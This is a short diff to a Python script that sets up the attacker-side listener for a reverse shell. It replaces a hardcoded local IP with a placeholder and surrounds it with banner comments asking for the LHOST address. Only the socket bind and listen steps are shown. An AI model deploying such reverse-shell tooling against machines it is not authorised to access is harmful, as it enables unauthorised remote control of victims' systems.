@@ -79,7 +79,19 @@ def target_communication():
 # Initiating socket object; specifying connection over IPv4, using TCP connection.
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 # Binding the LHOST IP address to the designated LPORT.
-sock.bind(('192.168.0.21', 5555))
+
+
+
+# **************************************************************************
+# ***** v ENTER LOCAL HOST (LHOST) IP & LISTENING PORT (LPORT) HERE! v *****
+# **************************************************************************
+sock.bind(('ENTER LHOST IP HERE', 5555))
+# **************************************************************************
+# ***** v ENTER LOCAL HOST (LHOST) IP & LISTENING PORT (LPORT) HERE! v *****
+# **************************************************************************
+
+
+
 # Listen for up to 5 incoming connections from reverse shell.
 print('[+] Listening for the incoming connections...')
 sock.listen(5)
